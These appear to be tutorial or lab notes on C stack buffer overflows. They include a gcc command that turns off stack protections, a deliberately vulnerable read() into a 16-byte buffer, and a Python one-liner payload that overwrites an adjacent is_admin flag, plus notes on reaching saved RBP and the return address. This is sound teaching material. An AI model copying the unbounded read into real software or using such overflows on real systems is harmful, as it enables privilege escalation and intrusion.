Character-array overflow/oversized input
==============================================

gcc -g -O0 -fno-stack-protector -no-pie -z execstack -o vuln stack.c


Structure layout 

struct Frame
{
    char buffer[16];
    int is_admin;
};

Memory on the stack looks roughly like:


+----------------+
| buffer[16]     | 16 bytes
+----------------+
| is_admin       | 4 bytes
+----------------+


Vulnerable code
read(0, f.buffer, 32);
read() is told to read up to 32 bytes into a buffer that can only hold 16 bytes.


Buffer size = 16 bytes 
Read size = 32 bytes
This allows input to continue beyond buffer and overwrite nearby memory.


If you run:
./vuln

and type:
a

Memory becomes:
buffer: 61 0a ... 
is_admin: 00 00 00 00


Because is_admin remains zero:
if (f.is_admin == 1)

is false, so:
Normal user


python3 -c 'import sys; sys.stdout.buffer.write(b"A"*16 + b"\x01\x00\x00\x00")' | ./vuln

b"A"*16

fills the entire buffer:
AAAAAAAAAAAAAAAA

Memory:
buffer: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41


Second part:

b"\x01\x00\x00\x00"

writes four more bytes.
These bytes land on:
is_admin


Memory becomes:

buffer: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
 is_admin: 01 00 00 00

Why 01 00 00 00 equals 1

Most Linux systems on x86/x86-64 are little-endian.
The integer bytes:01 00 00 00

are interpreted as:0x00000001

which is decimal:1

Therefore:
f.is_admin == 1 becomes true.

Character-array overflow/stack char
=======================================

char buffer[16];
read(0, buffer, 100);

Because buffer is only 16 bytes and read() accepts up to 100 bytes, data can overwrite adjacent stack memory.

A typical stack frame might look something like:
Higher addresses +------------------+ 
| Return Address | 
+------------------+
 | Saved RBP | 
+------------------+ 
| buffer[16] | 
+------------------+ 
Lower addresses

When read() writes more than 16 bytes:
AAAAAAAAAAAAAAAAAAAAAAAAAAAA... ^^^^^^^^^^^^^^^^ fills buffer additional bytes continue beyond buffer

Before entering vuln, the previous frame pointer is stored.
buffer --> 16 bytes 
saved RBP --> 8 bytes

On a 64-bit system:
RBP = 8 bytes
RIP = 8 bytes
